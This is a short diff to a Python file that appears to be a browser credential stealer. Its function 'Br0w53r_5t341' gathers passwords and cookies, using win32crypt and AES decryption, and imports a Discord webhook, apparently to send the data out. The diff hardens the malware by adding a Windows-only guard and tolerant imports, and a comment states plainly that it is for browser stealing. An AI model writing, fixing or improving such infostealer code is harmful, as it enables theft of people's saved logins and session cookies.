@@ -82,16 +82,23 @@ except:
   a = 0
     
 def Br0w53r_5t341():
+    if not sys.platform.startswith("win"):
+        return  # Browser stealing only works on Windows
+        
     import os
     import shutil
     import json
     import base64
     import sqlite3
-    import win32crypt
     from zipfile import ZipFile
-    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
-    from discord import SyncWebhook, Embed, File
     from pathlib import Path
+    
+    try:
+        import win32crypt
+        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+        from discord import SyncWebhook, Embed, File
+    except ImportError:
+        return  # Required modules not available
 
     PASSWORDS = []
     COOKIES = []
